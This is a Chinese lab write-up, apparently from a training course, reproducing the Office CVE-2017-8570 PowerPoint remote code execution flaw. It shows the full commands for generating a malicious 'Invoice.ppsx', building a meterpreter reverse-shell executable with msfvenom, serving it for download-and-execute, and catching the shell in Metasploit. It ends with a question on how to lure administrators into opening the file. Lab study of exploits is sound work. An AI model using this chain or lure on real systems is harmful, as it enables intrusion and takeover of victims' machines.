# Office CVE-2017-8570 远程代码执行漏洞复现 - 红与黑 hyh - 博客园

> 原文：[`www.cnblogs.com/hyh123/p/7425588.html`](https://www.cnblogs.com/hyh123/p/7425588.html)

#### 实验环境

*   操作机：`Kali Linux` IP：`172.16.11.2`

*   目标机：`windows7 x64` IP：`172.16.12.2`

### 实验目的

*   掌握漏洞的利用方法

### 实验工具

*   `Metaspliot`：它是一款开源的安全漏洞检测工具，可以帮助安全和 IT 专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web 应用程序扫描，社会工程,团队合作。

### 实验内容

* * *

**Office CVE-2017-8570**

`CVE-2017-8570`漏洞为一个逻辑漏洞，利用方法简单，影响范围广。由于该漏洞和三年前的 SandWorm（沙虫）漏洞非常类似，因此我们称之为“沙虫”二代漏洞：Office 全家桶

**漏洞介绍**

Office`CVE-2017-8570`2017 年 7 月，微软在例行的阅读补丁中修复了多个`Microsoft Office`漏洞，其中的`CVE-2017-8570`漏洞为一个逻辑漏洞，利用方法简单。网上公布了利用代码影响范围广泛。该漏洞为`Microsoft Office`的一个远程代码执行漏洞。

其成因是`Microsof PowerPoint`执行时会初始化`“script”Moniker`对象，而在`PowerPoint`播放动画期间会激活该对象，从而执行`sct`脚本`(Windows script Component)`文件。攻击这可以欺骗用户运行含有该漏洞的 PPT 文件导致获取和当前登录用户相同的执行权限。

**影响版本**

*   Microsoft Office 2007 Service Pack 3
*   Microsoft Office 2010 Service Pack 2 (32-bit editions)
*   Microsoft Office 2010 Service Pack 2 (64-bit editions)
*   Microsoft Office 2013 RT Service Pack 1
*   Microsoft Office 2013 Service Pack 1 (32-bit editions)
*   Microsoft Office 2013 Service Pack 1 (64-bit editions)
*   Microsoft Office 2016 (32-bit edition)
*   Microsoft Office 2016 (64-bit edition)

#### 实验步骤

#### 步骤 1：生成恶意的 PPSX 文件

我们首先使用`Xshell`连接 Kali 机器，点击桌面`Xshell`图标，输入 IP：`172.16.12.2`，账号为:`root` 密码:`123456` ，如图：

![11](https://static2.ichunqiu.com/icq/resources/fileupload/58919/11.png)

首先我们在 Kali 中执行如下命令：

```
cd  CVE-2017-8570       //进入 exploit 的目录

python cve-2017-8570_toolkit.py  -M gen -w Invoice.ppsx -u http://172.16.12.2/logo.doc       //生成 ppsx 恶意文件 
```

![1](https://static2.ichunqiu.com/icq/resources/fileupload/58919/1.png)

使用 ls 命令，可以看到已经成功生成了 ppsx 格式文件。

![2](https://static2.ichunqiu.com/icq/resources/fileupload/58919/2.png)

接下来我们生成恶意`PPSX`文件通过调用 Powershell 下载并执行的反弹木马。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=4444 -f exe > /tmp/shell.exe 
```

其中 `-p` 参数是 payload 的意思，使用的 windows 的 meterpreter 的反弹木马`-f`参数 指定输出文件后缀为 exe 文件再用`>`重定向输出到 tmp 目录下

![3](https://static2.ichunqiu.com/icq/resources/fileupload/58919/3.png)

接下来输入如下命令:

```
python cve-2017-8570_toolkit.py -M exp -e http://172.16.12.2/shell.exe -l /tmp/shell.exe 
```

这段命令是通过脚本在 80 端口监听，等待接收 ppsx 请求并下载执行我们的反弹木马

![4](https://static2.ichunqiu.com/icq/resources/fileupload/58919/4.png)

接下来进入 Metasploit，新建一个 Kali`172.16.12.2 的连接，设置相关参数，接受返回的 Shell

```
msfconsole
use multi/handler   //使用监听模块
set payload windows/meterpreter/reverse_tcp    //设置 Payload
set LHOST 172.16.12.2   //设置本地接收 IP
run 
```

![5](https://static2.ichunqiu.com/icq/resources/fileupload/58919/5.png)

可以看到我们的`Metaspliot`已经在本地开启监听

到此我们的所有准备都做好，下一步我们模拟用户点击恶意文件

#### 步骤 2：目标机器执行恶意 PPSX 文件

我们使用桌面`Xftp`软件，连接上目标机`172.16.12.2`，将 Invoice.ppsx 文件拖到当前桌面上。

![12](https://static2.ichunqiu.com/icq/resources/fileupload/58919/12.png)

如图，他是一个 PPT 文件，我们模拟用户双击打开它。

![6](https://static2.ichunqiu.com/icq/resources/fileupload/58919/6.png)

![8](https://static2.ichunqiu.com/icq/resources/fileupload/58919/8.png)

执行过程中可以看到代码通过调用`powershell`在远程下载执行我们的恶意木马，此时已经反弹回了 shell

![9](https://static2.ichunqiu.com/icq/resources/fileupload/58919/9.png)

使用命令：

```
getuid     //获取当前用户 ID 
```

![10](https://static2.ichunqiu.com/icq/resources/fileupload/58919/10.png)

这样就获取了目标机器的权限，可以通过 Metasploit 去执行命令。

### 实验结果分析与总结

Office 一直是主流的办公软件，`CVE-2017-8570`这个漏洞影响 office 所有发行版本，当用户不经意点击了我们的恶意 PPSX 文件，那么我们就可以直接获取到他的用户权限，可以看到危害性十分高。

* * *

#### **修复方案**:

**补丁地址**：`https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8570`

### 思考

*   请思考，我们可以用什么方式诱发管理员触发这个漏洞？